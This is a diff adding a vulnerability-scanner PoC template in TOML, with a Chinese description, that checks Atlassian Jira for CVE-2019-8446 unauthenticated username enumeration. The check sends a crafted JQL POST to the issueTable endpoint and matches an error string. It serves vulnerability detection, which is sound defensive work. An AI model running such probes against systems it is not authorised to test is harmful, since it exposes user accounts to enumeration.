@@ -1,0 +1,34 @@
+[info]
+author = "ave"
+description = "通过向 Jira 的 /rest/issueNav/1/issueTable 接口发送特制 JQL 查询，验证是否存在未授权用户名枚举漏洞。当响应状态码为 200 且响应体中包含 'the user does not exist' 时，表示目标可能存在漏洞。"
+id = "POC-AVE-2019-0201"
+name = "Atlassian Jira 未授权用户名枚举漏洞 PoC"
+severity = "medium"
+tags = ["ave-2019-0201"]
+vuln_id = [
+    "CVE-2019-8446",
+    "AVE-2019-0201",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/rest/issueNav/1/issueTable"
+protocol = "http"
+
+[poc.requests.body]
+content = """{'jql':'project in projectsLeadByUser("{{randstr}}")'}"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["the user does not exist"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
